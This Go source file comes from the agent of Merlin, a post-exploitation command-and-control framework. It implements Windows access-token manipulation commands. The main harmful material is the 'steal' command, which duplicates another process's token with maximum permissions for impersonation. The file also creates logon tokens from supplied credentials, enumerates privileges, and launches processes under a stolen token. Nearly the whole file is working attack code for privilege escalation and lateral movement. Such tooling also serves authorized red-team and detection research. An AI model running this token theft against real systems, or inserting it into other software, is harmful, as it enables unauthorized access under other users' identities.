// +build windows

// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"bytes"
	"encoding/binary"
	"fmt"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	// X Packages
	"golang.org/x/sys/windows"

	// External
	"github.com/Ne0nd0g/oddments/pkg/process"
	"github.com/Ne0nd0g/oddments/pkg/tokens"
	"github.com/Ne0nd0g/oddments/windows/advapi32"

	// Merlin Main
	"github.com/Ne0nd0g/merlin/pkg/jobs"

	// Internal
	"github.com/Ne0nd0g/merlin-agent/cli"
)

var windowsToken windows.Token

// Token is the entrypoint for Jobs that are processed to determine which Token function should be executed
func Token(cmd jobs.Command) jobs.Results {
	cli.Message(cli.DEBUG, fmt.Sprintf("entering Token() with %+v", cmd))

	if len(cmd.Args) > 0 {
		switch strings.ToLower(cmd.Args[0]) {
		case "make":
			if len(cmd.Args) < 3 {
				return jobs.Results{
					Stderr: fmt.Sprintf("not enough arguments %d for the token make command", len(cmd.Args)),
				}
			}
			return makeToken(cmd.Args[1], cmd.Args[2])
		case "privs":
			if len(cmd.Args) > 1 {
				return listPrivileges(cmd.Args[1])
			} else {
				return listPrivileges("0")
			}
		case "rev2self":
			return rev2self()
		case "steal":
			if len(cmd.Args) < 2 {
				return jobs.Results{
					Stderr: "A Process ID (PID) must be provided for the token steal command",
				}
			}
			pid, err := strconv.Atoi(cmd.Args[1])
			if err != nil {
				return jobs.Results{
					Stderr: fmt.Sprintf("there was an error converting PID %s to an integeter: %s", cmd.Args[1], err),
				}
			}
			return stealToken(uint32(pid))
		case "whoami":
			return whoami()
		default:
			j := jobs.Results{
				Stderr: fmt.Sprintf("unrecognized Windows Access Token command: %s", cmd.Args[0]),
			}
			return j
		}
	}
	j := jobs.Results{
		Stderr: "no arguments were provided to the Windows Access Token module",
	}
	return j
}

// ApplyToken applies any stolen or created Windows access token's to the current thread
func ApplyToken() error {
	cli.Message(cli.DEBUG, "entering ApplyToken()")

	// Verify a token has been created/stolen and assigned to the global variable
	if windowsToken != 0 {
		// Apply the token to this process thread
		return advapi32.ImpersonateLoggedOnUserG(windowsToken)
	}
	return nil
}

// getTokenStats uses the GetTokenInformation Windows API call to gather information about the provided access token
// by retrieving the token's associated TOKEN_STATISTICS structure
func getTokenStats(token windows.Token) (tokenStats advapi32.TOKEN_STATISTICS, err error) {
	var returnLength uint32
	err = windows.GetTokenInformation(token, windows.TokenStatistics, nil, 0, &returnLength)
	if err != nil && err != syscall.ERROR_INSUFFICIENT_BUFFER {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Make the call with the known size of the object
	info := bytes.NewBuffer(make([]byte, returnLength))
	var returnLength2 uint32
	err = windows.GetTokenInformation(token, windows.TokenStatistics, &info.Bytes()[0], returnLength, &returnLength2)
	if err != nil {
		err = fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	err = binary.Read(info, binary.LittleEndian, &tokenStats)
	if err != nil {
		err = fmt.Errorf("there was an error reading binary into the TOKEN_STATISTICS structure: %s", err)
		return
	}
	return
}

// ListPrivileges will enumerate the privileges associated with a Windows access token
// If the Process ID (pid) is 0, then the privileges for the token associated with current process will enumerated
func listPrivileges(processID string) (results jobs.Results) {
	// Convert PID from string to int
	pid, err := strconv.Atoi(processID)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error converting %s to an integer: %s", processID, err)
		return
	}

	var token windows.Token

	if pid == 0 && windowsToken != 0 {
		pid = os.Getpid()
		token = windowsToken
		results.Stdout += "Enumerating privileges using previously stolen or created Windows access token\n"
	} else {
		if pid == 0 {
			pid = os.Getpid()
		}
		// Get a handle to the current process
		hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, uint32(pid))
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error calling windows.OpenProcess(): %s", err)
			return
		}

		// Close the handle when done
		defer func() {
			err := windows.CloseHandle(hProc)
			if err != nil {
				results.Stderr += fmt.Sprintf("there was an error calling windows.CloseHandle() for the process: %s\n", err)
			}
		}()

		// Use process handle to get a token
		err = windows.OpenProcessToken(hProc, windows.TOKEN_QUERY, &token)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error calling windows.OpenProcessToken(): %s", err)
			return
		}

		// Close the handle when done
		defer func() {
			err := token.Close()
			if err != nil {
				results.Stderr += fmt.Sprintf("there was an error calling token.Close(): %s\n", err)
			}
		}()
	}

	// Get token integrity level
	var TokenIntegrityLevel uint32 = 25
	t := unsafe.Pointer(token)
	TokenIntegrityInformation, ReturnLength, err := advapi32.GetTokenInformationN(&t, TokenIntegrityLevel)
	if err != nil {
		results.Stderr = fmt.Sprintf(fmt.Sprintf("there was an error calling tokens.GetTokenInformationN: %s", err))
		return
	}

	// Read the buffer into a byte slice
	bLabel := make([]byte, ReturnLength)
	err = binary.Read(TokenIntegrityInformation, binary.LittleEndian, &bLabel)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error reading bytes for the token integrity level: %s", err)
		return
	}

	// Integrity level is in the Attributes portion of the structure, a DWORD, the last four bytes
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_and_attributes
	integrityLevel := binary.LittleEndian.Uint32(bLabel[ReturnLength-4:])

	// Get the privileges and attributes
	// Call to get structure size
	var returnedLen uint32
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, nil, 0, &returnedLen)
	if err != syscall.ERROR_INSUFFICIENT_BUFFER {
		results.Stderr = fmt.Sprintf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	// Call again to get the actual structure
	info := bytes.NewBuffer(make([]byte, returnedLen))
	err = windows.GetTokenInformation(token, windows.TokenPrivileges, &info.Bytes()[0], returnedLen, &returnedLen)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling windows.GetTokenInformation: %s", err)
		return
	}

	var privilegeCount uint32
	err = binary.Read(info, binary.LittleEndian, &privilegeCount)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error reading TokenPrivileges bytes to privilegeCount: %s", err)
		return
	}

	// Read in the LUID and Attributes
	var privs []windows.LUIDAndAttributes
	for i := 1; i <= int(privilegeCount); i++ {
		var priv windows.LUIDAndAttributes
		err = binary.Read(info, binary.LittleEndian, &priv)
		if err != nil {
			results.Stderr = fmt.Sprintf("there was an error reading LUIDAttributes to bytes: %s", err)
		}
		privs = append(privs, priv)
	}

	results.Stdout += fmt.Sprintf("Process ID %d access token integrity level: %s, privileges (%d):\n", pid, integrityLevelToString(integrityLevel), privilegeCount)

	for _, v := range privs {
		var luid advapi32.LUID
		luid.HighPart = v.Luid.HighPart
		luid.LowPart = v.Luid.LowPart
		p, err := advapi32.LookupPrivilegeName(luid)
		if err != nil {
			results.Stderr = err.Error()
			return
		}
		results.Stdout += fmt.Sprintf("\tPrivilege: %s, Attribute: %s\n", p, tokens.PrivilegeAttributeToString(v.Attributes))
	}
	return
}

// makeToken creates a new type 9 logon session for the provided user and applies the returned Windows access token to
// the current process using the ImpersonateLoggedOnUser Windows API call
func makeToken(username, password string) (results jobs.Results) {
	// Make token
	token, err := tokens.LogonUserG(username, password, "", advapi32.LOGON32_LOGON_NEW_CREDENTIALS, advapi32.LOGON32_PROVIDER_DEFAULT)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Set token
	/*
		err = advapi32.ImpersonateLoggedOnUserG(token)
		if err != nil {
			results.Stderr = err.Error()
			return
		}
	*/

	windowsToken = token

	// Get Token Stats
	stats, err := tokens.GetTokenStatsG(token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = fmt.Sprintf("Successfully created a Windows access token for %s with a logon ID of 0x%X", username, stats.AuthenticationId.LowPart)

	/*
		// Get Thread Username
		userThread, err := getTokenUsername(windows.GetCurrentThreadEffectiveToken())
		if err != nil {
			results.Stderr = err.Error()
		}

		// Keeps returning the username for the parent process
		results.Stdout += fmt.Sprintf("\nImpersonated %s", userThread)
	*/
	return
}

// rev2self releases or drops any impersonation tokens applied to the current process, reverting to its original state
func rev2self() (results jobs.Results) {
	windowsToken = 0
	err := advapi32.RevertToSelfN()
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = "Successfully reverted to self and dropped the impersonation token"
	return
}

// stealToken is a wrapper function that steals a token and applies it to the current process
func stealToken(pid uint32) (results jobs.Results) {
	if pid == 0 {
		results.Stderr = fmt.Sprintf("invalid Process ID (PID) of %d", pid)
		return
	}

	handle, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Defer closing the process handle
	defer func() {
		err = windows.Close(handle)
		if err != nil {
			fmt.Println(err.Error())
		}
	}()

	// Use the process handle to get its access token

	// These token privs are required to call CreateProcessWithToken or later
	DesiredAccess := windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_QUERY

	var token windows.Token
	err = windows.OpenProcessToken(handle, uint32(DesiredAccess), &token)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Duplicate the token with maximum permissions
	var dupToken windows.Token
	err = windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, &windows.SecurityAttributes{}, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
	if err != nil {
		results.Stderr = fmt.Sprintf("there was an error calling windows.DuplicateTokenEx: %s", err)
		return
	}

	windowsToken = dupToken

	/*
		// Apply the token to this process
		err = advapi32.ImpersonateLoggedOnUserG(token)
		if err != nil {
			results.Stderr = err.Error()
			return
		}
	*/

	// Get Thread Token TOKEN_STATISTICS structure
	statThread, err := getTokenStats(windowsToken)
	if err != nil {
		return
	}

	// Get Thread Username
	userThread, err := getTokenUsername(windowsToken)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout = fmt.Sprintf("Successfully stole token from PID %d for user %s with LogonID 0x%X", pid, userThread, statThread.AuthenticationId.LowPart)
	return
}

// whoami enumerates information about both the process and thread token currently being used
func whoami() (results jobs.Results) {
	// Process
	tProc := windows.GetCurrentProcessToken()

	// Get Process Username
	userProc, err := getTokenUsername(tProc)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	// Get Process Token TOKEN_STATISTICS structure
	statProc, err := getTokenStats(tProc)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout += fmt.Sprintf("Process (%s) Token:\n", tokenTypeToString(statProc.TokenType))
	results.Stdout += fmt.Sprintf("\tUser: %s", userProc)
	results.Stdout += fmt.Sprintf(",Token ID: 0x%X", statProc.TokenId.LowPart)
	results.Stdout += fmt.Sprintf(",Logon ID: 0x%X", statProc.AuthenticationId.LowPart)
	results.Stdout += fmt.Sprintf(",Privilege Count: %d", statProc.PrivilegeCount)
	results.Stdout += fmt.Sprintf(",Group Count: %d", statProc.GroupCount)
	results.Stdout += fmt.Sprintf(",Type: %s", tokenTypeToString(statProc.TokenType))
	results.Stdout += fmt.Sprintf(",Impersonation Level: %s", impersonationToString(statProc.ImpersonationLevel))

	// Process Token Integrity Level
	pLevel, err := getTokenIntegrityLevel(tProc)
	if err == nil {
		results.Stdout += fmt.Sprintf(",Integrity Level: %s", pLevel)
	}

	// Thread
	var tThread windows.Token
	// Lost the fight against the Go runtime managing threads so I can't depend on this thread having the token
	if windowsToken != 0 {
		tThread = windowsToken
	} else {
		tThread = windows.GetCurrentThreadEffectiveToken()
		//tThread = windows.GetCurrentThreadToken()
	}

	// Get Thread Token TOKEN_STATISTICS structure
	statThread, err := getTokenStats(tThread)
	if err != nil {
		return
	}

	// Get Thread Username
	userThread, err := getTokenUsername(tThread)
	if err != nil {
		results.Stderr = err.Error()
		return
	}

	results.Stdout += fmt.Sprintf("\nThread (%s) Token:\n", tokenTypeToString(statThread.TokenType))
	results.Stdout += fmt.Sprintf("\tUser: %s", userThread)
	results.Stdout += fmt.Sprintf(",Token ID: 0x%X", statThread.TokenId.LowPart)
	results.Stdout += fmt.Sprintf(",Logon ID: 0x%X", statThread.AuthenticationId.LowPart)
	results.Stdout += fmt.Sprintf(",Privilege Count: %d", statThread.PrivilegeCount)
	results.Stdout += fmt.Sprintf(",Group Count: %d", statThread.GroupCount)
	results.Stdout += fmt.Sprintf(",Type: %s", tokenTypeToString(statThread.TokenType))
	results.Stdout += fmt.Sprintf(",Impersonation Level: %s", impersonationToString(statThread.ImpersonationLevel))

	// Process Token Integrity Level
	tLevel, err := getTokenIntegrityLevel(tThread)
	if err == nil {
		results.Stdout += fmt.Sprintf(",Integrity Level: %s", tLevel)
	}

	return
}

// integrityLevelToString converts an access token integrity level to a string
// https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids
func integrityLevelToString(level uint32) string {
	switch level {
	case 0x00000000: // SECURITY_MANDATORY_UNTRUSTED_RID
		return "Untrusted"
	case 0x00001000: // SECURITY_MANDATORY_LOW_RID
		return "Low"
	case 0x00002000: // SECURITY_MANDATORY_MEDIUM_RID
		return "Medium"
	case 0x00002100: // SECURITY_MANDATORY_MEDIUM_PLUS_RID
		return "Medium High"
	case 0x00003000: // SECURITY_MANDATORY_HIGH_RID
		return "High"
	case 0x00004000: // SECURITY_MANDATORY_SYSTEM_RID
		return "System"
	case 0x00005000: // SECURITY_MANDATORY_PROTECTED_PROCESS_RID
		return "Protected Process"
	default:
		return fmt.Sprintf("Uknown integrity level: %d", level)
	}
}

// tokenTypeToString converts a TOKEN_TYPE uint32 value to it's associated string
func tokenTypeToString(tokenType uint32) string {
	switch tokenType {
	case advapi32.TokenPrimary:
		return "Primary"
	case advapi32.TokenImpersonation:
		return "Impersonation"
	default:
		return fmt.Sprintf("unknown TOKEN_TYPE: %d", tokenType)
	}
}

// impersonationToString converts a SECURITY_IMPERSONATION_LEVEL uint32 value to it's associated string
func impersonationToString(level uint32) string {
	switch level {
	case advapi32.SecurityAnonymous:
		return "Anonymous"
	case advapi32.SecurityIdentification:
		return "Identification"
	case advapi32.SecurityImpersonation:
		return "Impersonation"
	case advapi32.SecurityDelegation:
		return "Delegation"
	default:
		return fmt.Sprintf("unknown SECURITY_IMPERSONATION_LEVEL: %d", level)
	}
}

// getTokenIntegrityLevel enumerates the integrity level for the provided token and returns it as a string
func getTokenIntegrityLevel(token windows.Token) (string, error) {
	var info byte
	var returnedLen uint32
	// Call the first time to get the output structure size
	err := windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &info, 0, &returnedLen)
	if err != windows.ERROR_INSUFFICIENT_BUFFER {
		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
	}

	// Knowing the structure size, call again
	TokenIntegrityInformation := bytes.NewBuffer(make([]byte, returnedLen))
	err = windows.GetTokenInformation(token, windows.TokenIntegrityLevel, &TokenIntegrityInformation.Bytes()[0], returnedLen, &returnedLen)
	if err != nil {
		return "", fmt.Errorf("there was an error calling windows.GetTokenInformation: %s", err)
	}

	// Read the buffer into a byte slice
	bLabel := make([]byte, returnedLen)
	err = binary.Read(TokenIntegrityInformation, binary.LittleEndian, &bLabel)
	if err != nil {
		return "", fmt.Errorf("there was an error reading bytes for the token integrity level: %s", err)
	}

	// Integrity level is in the Attributes portion of the structure, a DWORD, the last four bytes
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_mandatory_label
	// https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-sid_and_attributes
	integrityLevel := binary.LittleEndian.Uint32(bLabel[returnedLen-4:])
	return integrityLevelToString(integrityLevel), nil
}

// getTokenUsername returns the domain and username associated with the provided token as a string
// TODO replace with oddments package once published
func getTokenUsername(token windows.Token) (username string, err error) {
	user, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("there was an error calling GetTokenUser(): %s", err)
	}

	account, domain, _, err := user.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("there was an error calling SID.LookupAccount(): %s", err)
	}

	username = fmt.Sprintf("%s\\%s", domain, account)
	return
}

// CreateProcessWithTokenN creates a new process as the user associated with the passed in token
// This requires administrative privileges or at least the SE_IMPERSONATE_NAME privilege
func CreateProcessWithTokenN(token *unsafe.Pointer, application string, args string) (err error) {
	if application == "" {
		err = fmt.Errorf("a program must be provided for the CreateProcessWithToken call")
		return
	}

	// Verify that the calling process has the SE_IMPERSONATE_NAME privilege
	luid, err := advapi32.LookupPrivilegeValueN("SeImpersonatePrivilege")
	if err != nil {
		return
	}

	hasPriv, err := hasPrivilege(process.GetCurrentProcessTokenN(), luid)
	if err != nil {
		return fmt.Errorf("the provided access token does not have the SeImpersonatePrivilege and can't be used to create a process")
	}

	// TODO try to enable the priv before returning with an error
	if !hasPriv {
		return fmt.Errorf("the provided access token does not have the SeImpersonatePrivilege and therefore can't be used to call CreateProcessWithToken")
	}

	// TODO verify the provided token is a PRIMARY token
	// TODO verify the provided token has the TOKEN_QUERY, TOKEN_DUPLICATE, and TOKEN_ASSIGN_PRIMARY access rights

	// Convert the program to a LPCWSTR
	lpApplicationName, err := syscall.UTF16PtrFromString(application)
	if err != nil {
		err = fmt.Errorf("there was an error converting the application name \"%s\" to LPCWSTR: %s", application, err)
		return
	}

	// Convert the program to a LPCWSTR
	lpCommandLine, err := syscall.UTF16PtrFromString(args)
	if err != nil {
		err = fmt.Errorf("there was an error converting the application arguments \"%s\" to LPCWSTR: %s", args, err)
		return
	}

	// BOOL CreateProcessWithTokenW(
	//  [in]                HANDLE                hToken,
	//  [in]                DWORD                 dwLogonFlags,
	//  [in, optional]      LPCWSTR               lpApplicationName,
	//  [in, out, optional] LPWSTR                lpCommandLine,
	//  [in]                DWORD                 dwCreationFlags,
	//  [in, optional]      LPVOID                lpEnvironment,
	//  [in, optional]      LPCWSTR               lpCurrentDirectory,
	//  [in]                LPSTARTUPINFOW        lpStartupInfo,
	//  [out]               LPPROCESS_INFORMATION lpProcessInformation
	//);

	lpCurrentDirectory := uint16(0)
	lpStartupInfo := &advapi32.StartupInfo{}
	lpProcessInformation := &advapi32.ProcessInformation{}

	err = advapi32.CreateProcessWithTokenN(
		token,
		advapi32.LOGON_NETCREDENTIALS_ONLY,
		lpApplicationName,
		lpCommandLine,
		0,
		0,
		&lpCurrentDirectory,
		lpStartupInfo,
		lpProcessInformation,
	)
	return
}

// hasPrivilege checks the provided access token to see if it contains the provided privilege
func hasPrivilege(token *unsafe.Pointer, privilege advapi32.LUID) (bool, error) {
	// Get privileges for the passed in access token
	TokenInformation, _, err := advapi32.GetTokenInformationN(token, advapi32.TokenPrivileges)
	if err != nil {
		return false, fmt.Errorf("there was an error calling GetTokenInformationN: %s", err)
	}

	var privilegeCount uint32
	err = binary.Read(TokenInformation, binary.LittleEndian, &privilegeCount)
	if err != nil {
		return false, fmt.Errorf("there was an error reading TokenPrivileges bytes to privilegeCount: %s", err)
	}

	// Read in the LUID and Attributes
	var privs []advapi32.LUID_AND_ATTRIBUTES
	for i := 1; i <= int(privilegeCount); i++ {
		var priv advapi32.LUID_AND_ATTRIBUTES
		err = binary.Read(TokenInformation, binary.LittleEndian, &priv)
		if err != nil {
			return false, fmt.Errorf("there was an error reading LUIDAttributes to bytes: %s", err)
		}
		privs = append(privs, priv)
	}

	// Iterate over provided token's privileges and return true if it is present
	for _, priv := range privs {
		if priv.Luid == privilege {
			return true, nil
		}
	}
	return false, nil
}
